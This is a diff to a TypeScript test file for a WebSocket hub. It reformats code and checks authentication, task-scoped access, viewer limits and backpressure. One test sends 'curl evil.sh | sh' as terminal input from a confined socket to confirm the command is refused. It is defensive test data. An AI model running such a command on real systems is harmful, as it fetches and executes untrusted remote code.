@@ -5,11 +5,27 @@ import type { AddressInfo } from 'node:net'
 import { WebSocket } from 'ws'
 import { afterEach, beforeEach, describe, expect, it } from 'vitest'
 import type { DeviceService } from '../auth/deviceTokens'
-import { decodeIdFrame, WS_BINARY_ID_BYTES, WS_PATH, WS_VIEWERS_HEADER, WS_MAX_VIEWERS, type WsServerWireFrame } from '@acorn/protocol/ws.ts'
-import { _resetWsHub, attachWsHub, authorizeWsUpgrade, disposeWsHub, registerWsChannelHandler, setStreamHandlers, wsBroadcast, type StreamSink } from './wsHub'
+import {
+  decodeIdFrame,
+  WS_BINARY_ID_BYTES,
+  WS_PATH,
+  WS_VIEWERS_HEADER,
+  WS_MAX_VIEWERS,
+  type WsServerWireFrame,
+} from '@acorn/protocol/ws.ts'
+import {
+  _resetWsHub,
+  attachWsHub,
+  authorizeWsUpgrade,
+  disposeWsHub,
+  registerWsChannelHandler,
+  setStreamHandlers,
+  wsBroadcast,
+  type StreamSink,
+} from './wsHub'
 type TestStreamMsg = Parameters<StreamSink>[0]
 
-// Headless verification of the delicate transport bits the smoke suite (S4) can't cover in a unit:
+// Headless verification of the delicate transport bits a smoke suite can't cover in a unit:
 // upgrade auth (device bearer / internal-token / host), per-connection seq,
 // revocation (immediate and by sweep), deterministic replay-before-live ordering on attach, input
 // routing, detach, and status broadcast. Drives a real `ws` client against a real http.Server with
@@ -65,7 +81,13 @@ beforeEach(async () => {
   devices = stubDevices()
   // 20ms sweep everywhere: the interval is injected rather than faked, so the sweep runs for real and
   // the assertion is about the socket closing, not about a timer having been scheduled.
-  attachWsHub(server, { internalToken: INTERNAL, internalCredentials: new EveryCredentialActive(), allowedHosts: new Set([host]), devices, revocationCheckMs: 20 })
+  attachWsHub(server, {
+    internalToken: INTERNAL,
+    internalCredentials: new EveryCredentialActive(),
+    allowedHosts: new Set([host]),
+    devices,
+    revocationCheckMs: 20,
+  })
 })
 
 afterEach(() => {
@@ -122,10 +144,9 @@ const decodeText = (frame: Buffer): { id: string; text: string } => {
 // Resolves once the socket has closed, so a revocation assertion waits for the real close rather than
 // polling readyState.
 const closed = (ws: WebSocket): Promise<void> => new Promise((r) => ws.on('close', () => r()))
-// Wait for a server-side effect to arrive, rather than sleeping a fixed interval and hoping. A
-// fixed 30ms sleep is what made this file the suite's most frequent load-sensitive failure: 30ms
-// is plenty on an idle machine and not always enough with 6 packages testing concurrently. The
-// timeout is generous because it only bounds a genuine hang, never the happy path.
+// Wait for a server-side effect to arrive, rather than sleeping a fixed interval and hoping. A fixed
+// sleep is plenty on an idle machine and not always enough with several packages testing
+// concurrently. The timeout is generous because it only bounds a genuine hang, never the happy path.
 const waitFor = async (predicate: () => boolean, label: string, timeoutMs = 5_000): Promise<void> => {
   const deadline = Date.now() + timeoutMs
   while (!predicate()) {
@@ -143,26 +164,35 @@ describe('opted-in event viewers', () => {
     const live = new Set<StreamSink>()
     const sizes: unknown[] = []
     setStreamHandlers({
-      input: () => {}, streamTaskId: () => 'task-a',
+      input: () => {},
+      streamTaskId: () => 'task-a',
       attach: (_id, sink, size) => {
-        live.add(sink); sizes.push(size)
+        live.add(sink)
+        sizes.push(size)
         sink({ type: 'ready', session: {}, replayed: true })
         sink({ type: 'output', data: 'canonical\u0000海' })
       },
-      detach: (_id, sink) => { live.delete(sink) },
+      detach: (_id, sink) => {
+        live.delete(sink)
+      },
     })
     const ws = await open({ ...authHeaders(), [WS_VIEWERS_HEADER]: '1' })
-    const json = frames(ws), binary = binaries(ws)
+    const json = frames(ws),
+      binary = binaries(ws)
     ws.send(wrap(A, { channel: 'term:attach', id: SESSION, cols: 81, rows: 25 }))
     await waitFor(() => binary.length === 1, 'A restore')
     ws.send(wrap(B, { channel: 'term:attach', id: SESSION, cols: 92, rows: 30 }))
     await waitFor(() => binary.length === 2, 'B restore')
     expect(live.size).toBe(2)
-    expect(sizes).toEqual([{ cols: 81, rows: 25 }, { cols: 92, rows: 30 }])
+    expect(sizes).toEqual([
+      { cols: 81, rows: 25 },
+      { cols: 92, rows: 30 },
+    ])
     expect(json.map((frame) => frame.viewerId)).toEqual([A, B])
     expect(json.map((frame) => frame.seq)).toEqual([1, 2])
     expect(binary.map((frame) => decodeIdFrame(frame)?.id)).toEqual([A, B])
-    for (const frame of binary) expect(decodeText(Buffer.from(decodeIdFrame(frame)!.payload))).toEqual({ id: SESSION, text: 'canonical\u0000海' })
+    for (const frame of binary)
+      expect(decodeText(Buffer.from(decodeIdFrame(frame)!.payload))).toEqual({ id: SESSION, text: 'canonical\u0000海' })
     ws.send(wrap(A, { channel: 'term:detach', id: SESSION }))
     await waitFor(() => live.size === 1, 'A detach')
     for (const sink of live) sink({ type: 'output', data: 'B continues' })
@@ -175,8 +205,19 @@ describe('opted-in event viewers', () => {
   })
 
   it('uses parent task claims for nested input and refuses unrelated terminal and plugin authority', async () => {
-    const inputs: string[] = [], attached: string[] = [], plugin: unknown[] = []
-    setStreamHandlers({ input: (id) => { inputs.push(id) }, attach: (id) => { attached.push(id) }, detach: () => {}, streamTaskId: (id) => id === SESSION ? 'task-a' : 'task-b' })
+    const inputs: string[] = [],
+      attached: string[] = [],
+      plugin: unknown[] = []
+    setStreamHandlers({
+      input: (id) => {
+        inputs.push(id)
+      },
+      attach: (id) => {
+        attached.push(id)
+      },
+      detach: () => {},
+      streamTaskId: (id) => (id === SESSION ? 'task-a' : 'task-b'),
+    })
     registerWsChannelHandler('probe', { onFrame: (frame) => plugin.push(frame), onDisconnect: () => {} })
     const credential = mintInternalToken(INTERNAL, { scope: 'task', taskId: 'task-a' })
     const ws = await open({ host, 'x-acorn-internal': credential, [WS_VIEWERS_HEADER]: '1' })
@@ -187,7 +228,9 @@ describe('opted-in event viewers', () => {
     ws.send(wrap(B, { channel: 'probe:action' }))
     ws.send(wrap(A, { channel: 'term:input', id: SESSION, data: 'barrier' }))
     await waitFor(() => inputs.length === 2, 'task frames processed')
-    expect(attached).toEqual([SESSION]); expect(inputs).toEqual([SESSION, SESSION]); expect(plugin).toEqual([])
+    expect(attached).toEqual([SESSION])
+    expect(inputs).toEqual([SESSION, SESSION])
+    expect(plugin).toEqual([])
     const broadcasts = frames(ws)
     wsBroadcast({ channel: 'probe:changed' })
     ws.ping()
@@ -198,13 +241,22 @@ describe('opted-in event viewers', () => {
 
   it('refuses malformed nesting and viewer overflow explicitly, then admits a freed slot', async () => {
     let calls = 0
-    registerWsChannelHandler('probe', { onFrame: (_frame, send) => { calls += 1; send({ channel: 'probe:ok' }) }, onDisconnect: () => {} })
+    registerWsChannelHandler('probe', {
+      onFrame: (_frame, send) => {
+        calls += 1
+        send({ channel: 'probe:ok' })
+      },
+      onDisconnect: () => {},
+    })
     const ws = await open({ ...authHeaders(), [WS_VIEWERS_HEADER]: '1' })
     const json = frames(ws)
     ws.send(wrap('invalid', { channel: 'probe:action' }))
     ws.send(wrap(A, { channel: 42 }))
     ws.send(JSON.stringify({ channel: 'probe:action' }))
-    const ids = Array.from({ length: WS_MAX_VIEWERS + 1 }, (_, index) => `00000000-0000-4000-8000-${String(index).padStart(12, '0')}`)
+    const ids = Array.from(
+      { length: WS_MAX_VIEWERS + 1 },
+      (_, index) => `00000000-0000-4000-8000-${String(index).padStart(12, '0')}`,
+    )
     for (const id of ids) ws.send(wrap(id, { channel: 'probe:action' }))
     await waitFor(() => json.some((frame) => frame.channel === 'ws:viewer-error'), 'explicit cap error')
     expect(calls).toBe(WS_MAX_VIEWERS)
@@ -217,6 +269,18 @@ describe('opted-in event viewers', () => {
 })
 
 describe('wsHub auth', () => {
+  // The hub is the listener's only upgrade handler, so an upgrade to any other path, such as the
+  // removed `/v1/tunnel`, must be destroyed rather than left open.
+  it('destroys an authenticated upgrade to any other path', async () => {
+    const ws = new WebSocket(`ws://${host}/v1/tunnel`, { headers: authHeaders() })
+    await expect(
+      new Promise((resolve, reject) => {
+        ws.on('open', resolve)
+        ws.on('error', reject)
+      }),
+    ).rejects.toThrow(/socket hang up/)
+  })
+
   it('rejects a socket with no token at all', async () => {
     await expect(open({ host })).rejects.toThrow(/403/)
   })
@@ -245,16 +309,35 @@ describe('wsHub auth', () => {
   })
 
   it('refuses internal upgrades from a remote socket while keeping the paired bearer', async () => {
-    const request = (headers: Record<string, string>) => ({
-      headers: { host, ...headers }, socket: { remoteAddress: '192.0.2.12' },
-    }) as unknown as IncomingMessage
-    const deps = { internalToken: INTERNAL, internalCredentials: new EveryCredentialActive(), allowedHosts: new Set([host]), devices }
-    expect(await authorizeWsUpgrade(request({ 'x-acorn-internal': mintInternalToken(INTERNAL, { scope: 'service' }), 'x-forwarded-for': '127.0.0.1' }), deps)).toBeNull()
-    expect(await authorizeWsUpgrade(request({ authorization: `Bearer ${DEVICE_TOKEN}` }), deps)).toEqual({ deviceId: 'd1' })
+    const request = (headers: Record<string, string>) =>
+      ({
+        headers: { host, ...headers },
+        socket: { remoteAddress: '192.0.2.12' },
+      }) as unknown as IncomingMessage
+    const deps = {
+      internalToken: INTERNAL,
+      internalCredentials: new EveryCredentialActive(),
+      allowedHosts: new Set([host]),
+      devices,
+    }
+    expect(
+      await authorizeWsUpgrade(
+        request({
+          'x-acorn-internal': mintInternalToken(INTERNAL, { scope: 'service' }),
+          'x-forwarded-for': '127.0.0.1',
+        }),
+        deps,
+      ),
+    ).toBeNull()
+    expect(await authorizeWsUpgrade(request({ authorization: `Bearer ${DEVICE_TOKEN}` }), deps)).toEqual({
+      deviceId: 'd1',
+    })
   })
 
   it('rejects a wrong internal token', async () => {
-    await expect(open({ host, 'x-acorn-internal': `${mintInternalToken(INTERNAL, { scope: 'service' })}-wrong` })).rejects.toThrow(/403/)
+    await expect(
+      open({ host, 'x-acorn-internal': `${mintInternalToken(INTERNAL, { scope: 'service' })}-wrong` }),
+    ).rejects.toThrow(/403/)
   })
 
   it('refuses a revoked bearer at the upgrade itself', async () => {
@@ -264,7 +347,13 @@ describe('wsHub auth', () => {
 
   // A presented-and-rejected credential is a rejection, not an invitation to try the next mechanism.
   it('does not fall back to the internal token when a bearer is present but bad', async () => {
-    await expect(open({ host, authorization: 'Bearer acorn_dt_wrong', 'x-acorn-internal': mintInternalToken(INTERNAL, { scope: 'service' }) })).rejects.toThrow(/403/)
+    await expect(
+      open({
+        host,
+        authorization: 'Bearer acorn_dt_wrong',
+        'x-acorn-internal': mintInternalToken(INTERNAL, { scope: 'service' }),
+      }),
+    ).rejects.toThrow(/403/)
   })
 })
 
@@ -376,9 +465,13 @@ describe('wsHub streaming', () => {
     liveSink!({ type: 'output', data: 'LIVE' } satisfies TestStreamMsg)
     await waitFor(() => bin.length >= 2, 'the live frame')
     // `ready` carries a session object, so it is still JSON. Spelled out rather than Extract<>'d: the
-    // frame envelope is open now, so there is no union left to discriminate. The shape asserted here
+    // frame envelope is open, so there is no union left to discriminate. The shape asserted here
     // is terminal's, and this is a terminal test.
-    const outs = got.filter((f) => f.channel === 'term:out') as unknown as { channel: 'term:out'; id: string; msg: TestStreamMsg }[]
+    const outs = got.filter((f) => f.channel === 'term:out') as unknown as {
+      channel: 'term:out'
+      id: string
+      msg: TestStreamMsg
+    }[]
     expect(outs.map((f) => f.msg.type)).toEqual(['ready'])
     // …and the output is bytes, tagged with the session, in order: live strictly after the restore.
     expect(bin.map(decodeText)).toEqual([
@@ -494,7 +587,11 @@ describe('wsHub streaming', () => {
     await waitFor(() => got.length >= 1, 'the JSON fallback')
 
     expect(bin).toEqual([])
-    expect(got[0]).toMatchObject({ channel: 'term:out', id: 'short-id', msg: { type: 'output', data: 'STILL DELIVERED' } })
+    expect(got[0]).toMatchObject({
+      channel: 'term:out',
+      id: 'short-id',
+      msg: { type: 'output', data: 'STILL DELIVERED' },
+    })
     ws.close()
   })
 
@@ -538,7 +635,12 @@ describe('wsHub streaming', () => {
 
   it('detach removes the sink; status broadcast reaches the socket', async () => {
     let detached = false
-    setStreamHandlers({ input: () => {}, attach: (_id, sink) => sink({ type: 'ready', session: { id: 's1' } as never, replayed: false }), detach: () => (detached = true), streamTaskId: () => 'task-1' })
+    setStreamHandlers({
+      input: () => {},
+      attach: (_id, sink) => sink({ type: 'ready', session: { id: 's1' } as never, replayed: false }),
+      detach: () => (detached = true),
+      streamTaskId: () => 'task-1',
+    })
     const ws = await open(authHeaders())
     const got = frames(ws)
     ws.send(JSON.stringify({ channel: 'term:attach', id: 's1' }))
@@ -553,7 +655,7 @@ describe('wsHub streaming', () => {
 })
 
 // A task-scoped internal credential is confined to its own task's streams
-// (docs/security/transport-and-auth.md § Transport and auth, on the finding this test guards against).
+// (docs/security/transport-and-auth.md § Transport and auth).
 describe('wsHub task scope', () => {
   const streamHandlers = (seen: string[]) => ({
     input: (id: string, data: string) => void seen.push(`input:${id}:${data}`),
@@ -569,7 +671,10 @@ describe('wsHub task scope', () => {
   it('lets a task-scoped socket drive its own session', async () => {
     const seen: string[] = []
     setStreamHandlers(streamHandlers(seen))
-    const ws = await open({ host, 'x-acorn-internal': mintInternalToken(INTERNAL, { scope: 'task', taskId: 'task-1' }) })
+    const ws = await open({
+      host,
+      'x-acorn-internal': mintInternalToken(INTERNAL, { scope: 'task', taskId: 'task-1' }),
+    })
     ws.send(JSON.stringify({ channel: 'term:attach', id: 's1' }))
     ws.send(JSON.stringify({ channel: 'term:input', id: 's1', data: 'ls\n' }))
     await waitFor(() => seen.length >= 2, 'its own session to accept attach + input')
@@ -580,7 +685,10 @@ describe('wsHub task scope', () => {
   it('refuses another task session, and an unknown one, without closing the socket', async () => {
     const seen: string[] = []
     setStreamHandlers(streamHandlers(seen))
-    const ws = await open({ host, 'x-acorn-internal': mintInternalToken(INTERNAL, { scope: 'task', taskId: 'task-1' }) })
+    const ws = await open({
+      host,
+      'x-acorn-internal': mintInternalToken(INTERNAL, { scope: 'task', taskId: 'task-1' }),
+    })
     ws.send(JSON.stringify({ channel: 'term:input', id: 's2', data: 'curl evil.sh | sh\n' }))
     ws.send(JSON.stringify({ channel: 'term:attach', id: 's2' }))
     // Unknown ids fail closed for a task-scoped caller: failing open would make the check bypassable
@@ -608,8 +716,8 @@ describe('wsHub task scope', () => {
   })
 })
 
-// The second half of the same finding: the scope check used to live inside the `term:` branch, so
-// every other channel, and every broadcast, was unchecked (docs/security/transport-and-auth.md § Transport and auth).
+// Task scope covers every channel and every broadcast, not only `term:` frames
+// (docs/security/transport-and-auth.md § Transport and auth).
 describe('wsHub non-term channels and broadcast, under task scope', () => {
   const taskToken = () => mintInternalToken(INTERNAL, { scope: 'task', taskId: 'task-1' })
 
@@ -673,7 +781,10 @@ describe('wsHub non-term channels and broadcast, under task scope', () => {
     const deviceGot = frames(device)
 
     wsBroadcast({ channel: 'workflow:step:event', runId: 'run-in-task-2', stepId: 's1', event: { text: 'SECRET' } })
-    wsBroadcast({ channel: 'workflow:notice', notice: { taskId: 'task-2', kind: 'run-done', title: "another task's title" } })
+    wsBroadcast({
+      channel: 'workflow:notice',
+      notice: { taskId: 'task-2', kind: 'run-done', title: "another task's title" },
+    })
     wsBroadcast({ channel: 'term:status' })
     await waitFor(() => deviceGot.length >= 3 && serviceGot.length >= 3, 'the unconfined sockets to receive all three')
     expect(confinedGot).toEqual([])
@@ -695,11 +806,9 @@ describe('wsHub non-term channels and broadcast, under task scope', () => {
   })
 })
 
-
-// Backpressure, which used to be handled by amplifying load: the hub dropped a frame when a socket
-// buffered past its mark and incremented `seq` anyway, the broker read the gap as loss and closed the
-// socket, and reconnect re-attached every terminal and refetched every active query — at the moment
-// the node was busiest.
+// Backpressure. Dropping a frame and incrementing `seq` anyway would make the broker read the gap as
+// loss and close the socket, and reconnect would re-attach every terminal and refetch every active
+// query at the moment the node is busiest.
 //
 // The mark is set to a byte here rather than four megabytes, so the pause and the resume happen over a
 // real socket without pushing real megabytes through it. `paused` on the client end is what makes the
@@ -710,7 +819,13 @@ describe('wsHub backpressure', () => {
   let tinyHost: string
 
   const openTiny = (viewers = false): Promise<WebSocket> => {
-    const ws = new WebSocket(`ws://${tinyHost}${WS_PATH}`, { headers: { host: tinyHost, authorization: `Bearer ${DEVICE_TOKEN}`, ...(viewers ? { [WS_VIEWERS_HEADER]: '1' } : {}) } })
+    const ws = new WebSocket(`ws://${tinyHost}${WS_PATH}`, {
+      headers: {
+        host: tinyHost,
+        authorization: `Bearer ${DEVICE_TOKEN}`,
+        ...(viewers ? { [WS_VIEWERS_HEADER]: '1' } : {}),
+      },
+    })
     return new Promise((resolve, reject) => {
       ws.on('open', () => resolve(ws))
       ws.on('error', reject)
@@ -729,7 +844,14 @@ describe('wsHub backpressure', () => {
     tiny = createServer()
     await listen(tiny)
     tinyHost = `127.0.0.1:${(tiny.address() as AddressInfo).port}`
-    attachWsHub(tiny, { internalToken: INTERNAL, internalCredentials: new EveryCredentialActive(), allowedHosts: new Set([tinyHost]), devices, revocationCheckMs: 5_000, maxBufferedBytes: 1 })
+    attachWsHub(tiny, {
+      internalToken: INTERNAL,
+      internalCredentials: new EveryCredentialActive(),
+      allowedHosts: new Set([tinyHost]),
+      devices,
+      revocationCheckMs: 5_000,
+      maxBufferedBytes: 1,
+    })
   })
 
   afterEach(() => {
@@ -757,7 +879,8 @@ describe('wsHub backpressure', () => {
     ws.pause()
 
     const big = 'x'.repeat(1_000_000)
-    for (let i = 0; i < 4; i++) wsBroadcast({ channel: 'term:out', id: 's1', msg: { type: 'output', data: big } as never })
+    for (let i = 0; i < 4; i++)
+      wsBroadcast({ channel: 'term:out', id: 's1', msg: { type: 'output', data: big } as never })
 
     await waitFor(() => paused.some(([, isPaused]) => isPaused), 'the PTY to be paused')
     expect(paused[0]).toEqual(['s1', true])
@@ -842,16 +965,34 @@ describe('wsHub backpressure', () => {
   it('delivers capacity refusal under congestion without shedding it or skipping physical sequence', async () => {
     const ws = await openTiny(true)
     const got = frames(ws)
-    for (let i = 0; i < WS_MAX_VIEWERS; i++) ws.send(JSON.stringify({ channel: 'ws:viewer', viewerId: `00000000-0000-4000-8000-${String(i).padStart(12, '0')}`, frame: { channel: 'ws:viewer-open' } }))
-    await new Promise<void>((resolve) => { ws.once('pong', resolve); ws.ping() })
+    for (let i = 0; i < WS_MAX_VIEWERS; i++)
+      ws.send(
+        JSON.stringify({
+          channel: 'ws:viewer',
+          viewerId: `00000000-0000-4000-8000-${String(i).padStart(12, '0')}`,
+          frame: { channel: 'ws:viewer-open' },
+        }),
+      )
+    await new Promise<void>((resolve) => {
+      ws.once('pong', resolve)
+      ws.ping()
+    })
     ws.pause()
     wsBroadcast({ channel: 'term:out', id: 'congested', msg: { type: 'output', data: 'x'.repeat(4_000_000) } as never })
     wsBroadcast({ channel: 'tasks:changed' })
-    ws.send(JSON.stringify({ channel: 'ws:viewer', viewerId: 'aaaaaaaa-aaaa-4aaa-aaaa-aaaaaaaaaaaa', frame: { channel: 'term:attach', id: OTHER_SESSION } }))
+    ws.send(
+      JSON.stringify({
+        channel: 'ws:viewer',
+        viewerId: 'aaaaaaaa-aaaa-4aaa-aaaa-aaaaaaaaaaaa',
+        frame: { channel: 'term:attach', id: OTHER_SESSION },
+      }),
+    )
     await new Promise((resolve) => setTimeout(resolve, 20))
     ws.resume()
     await waitFor(() => got.some((frame) => frame.channel === 'ws:viewer-error'), 'the capacity refusal')
-    expect(got.filter((frame) => frame.channel === 'ws:viewer-error')).toEqual([expect.objectContaining({ viewerId: 'aaaaaaaa-aaaa-4aaa-aaaa-aaaaaaaaaaaa', code: 'viewer_limit' })])
+    expect(got.filter((frame) => frame.channel === 'ws:viewer-error')).toEqual([
+      expect.objectContaining({ viewerId: 'aaaaaaaa-aaaa-4aaa-aaaa-aaaaaaaaaaaa', code: 'viewer_limit' }),
+    ])
     expect(got.map((frame) => frame.seq)).toEqual(got.map((_frame, i) => i + 1))
     expect(got.some((frame) => frame.channel === 'ws:shed')).toBe(true)
     ws.close()
